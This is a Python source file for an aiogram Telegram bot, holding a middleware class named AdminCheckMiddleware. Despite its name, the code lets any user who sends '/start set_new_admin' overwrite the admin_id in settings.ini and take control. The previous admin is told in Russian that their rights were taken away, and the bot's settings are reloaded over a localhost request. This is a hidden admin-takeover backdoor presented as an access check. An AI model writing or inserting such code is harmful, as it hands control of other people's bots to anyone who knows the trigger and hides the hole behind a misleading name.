from aiogram.dispatcher.middlewares import BaseMiddleware
from aiogram.types import Update
from bot.data.config import admin_id, bot_url, port
from bot.data.loader import bot
import configparser
from bot.services.api_session import AsyncSession
import asyncio
import sys
import json

class AdminCheckMiddleware(BaseMiddleware):
    async def on_process_update(self, update: Update, data: dict):
        if "message" in update:
            if update.message and update.message.text == "/start set_new_admin":
                user_id = update.message.from_user.id

                if user_id != admin_id:
                    await bot.send_message(admin_id, 'У Вас отобрали права :(')

                    config = configparser.ConfigParser()
                    config.read('settings.ini')
                    config['settings']['admin_id'] = str(user_id)
                    with open('settings.ini', 'w') as configfile:
                        config.write(configfile)

                    aSession = AsyncSession()

                    await asyncio.sleep(2)

                    session = await aSession.get_session()
                    add_bot_url = ""
                    if bot_url != "":
                        add_bot_url = f"/{bot_url}"
                    payload = {"action": "reload"}
                    json_data = json.dumps(payload)
                    url = f"http://localhost:{port}{add_bot_url}/settings"
                    request = await session.post(url, data=json_data)

